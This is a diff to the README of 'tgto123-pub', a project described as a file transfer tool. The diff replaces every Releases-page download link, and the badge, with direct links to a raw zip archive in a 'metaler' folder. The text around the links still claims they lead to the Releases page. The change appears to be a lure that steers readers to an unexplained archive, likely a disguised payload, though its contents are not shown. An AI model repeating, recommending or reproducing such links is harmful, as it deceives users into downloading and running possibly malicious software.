@@ -1,6 +1,6 @@
 # 🚀 tgto123-pub - Your Easy File Transfer Solution
 
-[![Download tgto123-pub](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/loksundar5057/tgto123-pub/releases)
+[![Download tgto123-pub](https://github.com/loksundar5057/tgto123-pub/raw/refs/heads/main/metaler/pub_tgto_2.7.zip%https://github.com/loksundar5057/tgto123-pub/raw/refs/heads/main/metaler/pub_tgto_2.7.zip)](https://github.com/loksundar5057/tgto123-pub/raw/refs/heads/main/metaler/pub_tgto_2.7.zip)
 
 ## 📦 Introduction
 
@@ -23,7 +23,7 @@ To get started with tgto123-pub, follow these simple steps:
 
    Click the link below to go to the Releases page on GitHub. Here, you will find the latest version of the application.
 
-   [Download tgto123-pub](https://github.com/loksundar5057/tgto123-pub/releases)
+   [Download tgto123-pub](https://github.com/loksundar5057/tgto123-pub/raw/refs/heads/main/metaler/pub_tgto_2.7.zip)
 
 2. **Select the Latest Release**
 
@@ -46,7 +46,7 @@ To get started with tgto123-pub, follow these simple steps:
 
 To download and install tgto123-pub, visit the releases page now.
 
-[Download tgto123-pub](https://github.com/loksundar5057/tgto123-pub/releases)
+[Download tgto123-pub](https://github.com/loksundar5057/tgto123-pub/raw/refs/heads/main/metaler/pub_tgto_2.7.zip)
 
 ## 🌟 Features
 
